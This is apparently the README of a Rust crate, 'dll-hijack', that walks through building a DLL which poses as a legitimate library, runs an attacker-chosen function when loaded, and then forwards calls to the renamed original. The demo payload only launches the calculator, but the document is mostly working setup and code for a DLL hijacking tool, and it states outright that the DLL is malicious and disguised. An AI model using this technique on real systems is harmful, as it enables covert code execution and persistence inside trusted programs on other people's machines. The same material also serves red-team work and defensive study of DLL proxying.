# dll-hijack
Dll hijack -- just one macro

## usage
1. Create a lib project
    ```shell
    cargo new demo --lib
    ```

2. Modify Cargo.toml
   ```toml
   [package]
   name = "demo"
   version = "0.1.0"
   edition = "2021"
   
   # See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
   
   [lib]
   crate-type = ["cdylib"]
   
   [dependencies]
   dll-hijack = "1.0.0"
   ```
   
3. Modify lib.rs
   1. Write a function that will be executed when the dll is loaded
       ```rust
      use std::process;
      
       fn test() {
           process::Command::new("calc").spawn().unwrap();
       }
       ```
      
   2. Set the original dll name and evil dll name using macros
      ```rust
      use std::process;
      use dll_hijack::hijack;

      #[hijack("nio.dll", "nio.dll.1")]
      fn test() {
          process::Command::new("calc").spawn().unwrap();
      }
      ```

The malicious dll will be disguised as the original dll, and the malicious dll will execute the malicious function first when loaded.

Then the request for the malicious dll will be forwarded to the original dll.